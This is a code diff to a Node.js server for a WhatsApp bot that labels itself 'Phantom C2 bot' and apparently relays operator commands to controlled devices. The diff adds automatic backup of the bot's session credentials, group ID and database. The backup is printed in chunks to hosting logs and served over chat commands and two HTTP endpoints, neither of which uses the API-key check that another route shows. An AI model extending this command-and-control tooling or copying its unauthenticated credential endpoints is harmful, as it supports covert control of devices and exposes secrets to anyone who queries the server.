@@ -9,6 +9,7 @@ import pino from 'pino';
 import fs from 'fs';
 import path from 'path';
 import os from 'os';
+import { execSync } from 'child_process';
 
 dotenv.config();
 
@@ -36,32 +37,50 @@ fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
 fs.mkdirSync(AUTH_DIR, { recursive: true });
 
 // ── Auth persistence: restore from env var backup ─────
-if (process.env.AUTH_INFO_BASE64 && fs.readdirSync(AUTH_DIR).length === 0) {
-  console.log('[+] Restoring auth_info from AUTH_INFO_BASE64 env var...');
+const RAF_BACKUP = path.join(os.tmpdir(), 'phantom_auth_backup.tar.gz');
+let autoBackupB64 = process.env.AUTH_INFO_BASE64 || null;
+
+function tryRestoreFrom(base64str) {
+  if (!base64str || base64str.length < 50) return false;
   try {
-    const buf = Buffer.from(process.env.AUTH_INFO_BASE64, 'base64');
-    const tmp = path.join(os.tmpdir(), 'phantom_auth_backup.tar.gz');
-    fs.writeFileSync(tmp, buf);
-    const { execSync } = await import('child_process');
-    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar xzf "${tmp}" 2>/dev/null`, { stdio: 'ignore' });
-    fs.unlinkSync(tmp);
-    console.log('[+] Auth info restored successfully');
+    const buf = Buffer.from(base64str, 'base64');
+    fs.writeFileSync(RAF_BACKUP, buf);
+    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar xzf "${RAF_BACKUP}" 2>/dev/null`, { stdio: 'ignore' });
+    return true;
+  } catch { return false; }
+}
+
+if (autoBackupB64 && fs.readdirSync(AUTH_DIR).length === 0) {
+  console.log('[+] Restoring auth_info from AUTH_INFO_BASE64...');
+  if (tryRestoreFrom(autoBackupB64)) console.log('[+] Auth info restored');
+  else console.error('[!] Auth restore failed');
+}
+
+// ── Auth backup function (persists auth_info + group_jid + db) ──
+async function generateAuthBackup() {
+  try {
+    const wd = path.dirname(AUTH_DIR);
+    const names = [path.basename(AUTH_DIR)];
+    if (fs.existsSync(GROUP_JID_PATH)) names.push(path.basename(GROUP_JID_PATH));
+    if (fs.existsSync(DB_PATH)) names.push(path.basename(DB_PATH));
+    execSync(`cd "${wd}" && tar czf "${RAF_BACKUP}" ${names.map(n => `"${n}"`).join(' ')} 2>/dev/null`, { stdio: 'ignore' });
+    const buf = fs.readFileSync(RAF_BACKUP);
+    const b64 = buf.toString('base64');
+    autoBackupB64 = b64;
+    return b64;
   } catch (e) {
-    console.error('[!] Auth restore failed:', e.message);
+    return null;
   }
 }
 
-// ── Auth backup function ──────────────────────────────
-async function backupAuthToBase64() {
-  try {
-    const { execSync } = await import('child_process');
-    const tmp = path.join(os.tmpdir(), 'phantom_auth_backup.tar.gz');
-    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar czf "${tmp}" "${path.basename(AUTH_DIR)}" 2>/dev/null`, { stdio: 'ignore' });
-    const buf = fs.readFileSync(tmp);
-    fs.unlinkSync(tmp);
-    return buf.toString('base64');
-  } catch (e) {
-    return `Error: ${e.message}`;
+async function autoBackupAndLog() {
+  const b64 = await generateAuthBackup();
+  if (b64 && b64 !== process.env.AUTH_INFO_BASE64) {
+    console.log(`[authbackup] Set AUTH_INFO_BASE64 env var to this value to persist across deploys:`);
+    // Print in chunks so Railway logs capture it fully
+    for (let i = 0; i < b64.length; i += 2000) {
+      console.log(`[authbackup] ${b64.slice(i, i + 2000)}`);
+    }
   }
 }
 
@@ -338,6 +357,8 @@ async function startBot() {
       if (alertJid) {
         try { await sock.sendMessage(alertJid, { text: '✅ *Phantom C2 bot online*\nSend `!menu` in this group to start.' }); } catch (e) { console.error('[!] online alert failed:', e.message); }
       }
+      // Auto-backup auth so it survives Railway restarts
+      await autoBackupAndLog();
     }
     if (connection === 'close') {
       const code = lastDisconnect?.error ? new Boom(lastDisconnect.error).output.statusCode : 500;
@@ -348,7 +369,10 @@ async function startBot() {
     }
   });
 
-  sock.ev.on('creds.update', saveCreds);
+  sock.ev.on('creds.update', async () => {
+    saveCreds();
+    await autoBackupAndLog();
+  });
 
   sock.ev.on('messages.upsert', async ({ messages, type }) => {
     try {
@@ -418,7 +442,7 @@ async function startBot() {
           if (plugin) {
             await plugin.handler(ctx);
           } else if (cmd === 'saveauth') {
-            const b64 = await backupAuthToBase64();
+            const b64 = autoBackupB64 || await generateAuthBackup();
             await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
           } else {
             await forwardToDevice(ctx);
@@ -441,7 +465,7 @@ async function startBot() {
       if (plugin) {
         await plugin.handler(ctx);
       } else if (cmd === 'saveauth') {
-        const b64 = await backupAuthToBase64();
+        const b64 = autoBackupB64 || await generateAuthBackup();
         await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
       } else if (cmd === 'd') {
         if (!args) {
@@ -554,8 +578,14 @@ app.post('/api/delete', requireApiKey, (req, res) => {
 
 app.get('/api/saveauth', async (req, res) => {
   if (!sock?.user) return res.status(503).json({ error: 'bot not connected' });
-  const b64 = await backupAuthToBase64();
+  const b64 = autoBackupB64 || await generateAuthBackup();
   res.json({ status: 'ok', bot: sock.user?.id, auth_base64: b64 });
+});
+
+app.get('/api/authbackup', (req, res) => {
+  if (!autoBackupB64) return res.status(404).send('No backup yet. Wait for bot to connect.');
+  res.set('Content-Type', 'text/plain');
+  res.send(autoBackupB64);
 });
 
 app.listen(PORT, () => {
